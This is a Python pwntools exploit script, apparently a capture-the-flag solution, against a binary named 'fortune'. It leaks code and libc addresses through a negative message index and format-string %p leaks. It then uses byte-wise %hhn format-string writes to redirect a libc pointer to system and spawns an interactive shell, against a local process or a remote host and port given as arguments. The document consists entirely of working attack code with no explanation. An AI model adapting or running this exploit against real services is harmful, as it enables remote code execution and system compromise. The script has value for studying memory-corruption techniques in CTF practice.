#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#import os
code = ELF('./fortune', checksec=False)
context.arch = code.arch
context.log_level = 'debug'
binsh = lambda : next(libc.search('/bin/sh'))
uu64 = lambda x: u64(x.ljust(8, '\0'))

def set_msg(s):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', s)

def print_msg(idx):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', str(idx))

def eq2(addr, val):
    for i in range(6):
        set_msg('\x00' + '%{}c%13$hhn'.format(i+8))
        print_msg(-5)
        set_msg('\x00' + '%{}c%43$hhn'.format((addr>>i*8)&0xff))
        print_msg(-5)

    set_msg('\x00' + '%{}c%13$hhn'.format(256))
    print_msg(-5)
    return

def eq(addr, val):
    for i in range(6):
        set_msg('\x00' + '%{}c%13$hhn'.format(256 if i==0 else i))
        print_msg(-5)
        set_msg('\x00' + '%{}c%43$hhn'.format((addr>>i*8)&0xff))
        print_msg(-5)

    set_msg('\x00' + '%{}c%13$hhn'.format(256))
    print_msg(-5)
    return

    for i,j in enumerate(p64(val)):
        set_msg('\x00' + '%{}c%43$hhn'.format((addr&0xff)+i))
        print_msg(-5)
        set_msg('\x00' + '%{}c%364$hhn'.format(u8(j)))
        print_msg(-5)

def exploit(r):
    print_msg(-19)
    r.recvuntil('\n')
    tmp = r.recvuntil('\n', drop=True)
    base = uu64(tmp) - 0x4008
    info('%#x code.address', base)

    set_msg('a'*0x58 + p64(base+0x4021))
    set_msg('\x00' + '%p@'*15)
    print_msg(-5)

    r.recvuntil('\n')
    tmp = r.recvuntil('\n', drop=True)
    libc.address = int(tmp.split('@')[8], 16) - 0x29d90
    print(tmp.split('@'))
    info('%#x libc.address', libc.address)

    #set_msg('\x00' + fmtstr_payload(8, {0x11223344: 0x55667788}, write_size='byte'))
    set_msg('\x00' + '%13$p')
    print_msg(-5)
    r.recvuntil('\n')
    tmp = r.recvuntil('\n', drop=True)
    s1 = int(tmp, 16)
    set_msg('\x00' + '%43$p')
    print_msg(-5)
    r.recvuntil('\n')
    tmp = r.recvuntil('\n', drop=True)
    s2 = int(tmp, 16)


    info('%#x s1', s1)
    info('%#x s2', s2)

    pos = ((s2&~0xff) - s1)/8+43

    eq(libc.address+0x219040, libc.sym['system'])
    eq2(libc.address+0x219040+2, libc.sym['system'])

    x1 = libc.sym['system']&0xffff
    x2 = 0x10000 - x1 + (libc.sym['system']>>16)&0xffff

    set_msg('\x00' + '%{}c%{}$hn%{}c%{}$hn'.format(x1, pos, x2, pos+1))
    print_msg(-5)

    set_msg('\x00' + '%1000c;sh;'*5)
    print_msg(-5)

    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 2:
        r = remote(sys.argv[1], int(sys.argv[2]))
        libc = code.libc if code.libc else ELF('./bc.so.6', checksec=False)
    else:
        r = code.process()
        libc = code.libc if code.libc else ELF('./bc.so.6', checksec=False)
    print code, libc
    exploit(r)
